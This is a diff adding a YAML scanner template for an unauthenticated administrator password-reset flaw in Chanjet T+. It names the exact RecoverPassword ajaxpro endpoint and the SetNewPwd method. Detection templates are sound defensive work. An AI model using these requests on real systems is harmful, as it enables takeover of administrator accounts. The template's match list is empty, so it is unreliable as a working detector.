@@ -1,0 +1,17 @@
+id: chanjet-tplus-unauth-passreset
+brief:
+    title: Chanjet Tplus - Unauthorized Password Reset
+    by: 0xr2r
+    level: high
+    about: There is an unauthorized administrator password modification vulnerability in UF Chanjet T+ RecoverPassword.aspx. An attacker can use this vulnerability to modify the administrator account password...
+    label:
+        - tplus
+        - unauth
+        - chanjet
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method={{randbase(6)}}'
+        - '{{BaseURL}}/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd'
+      signs: []
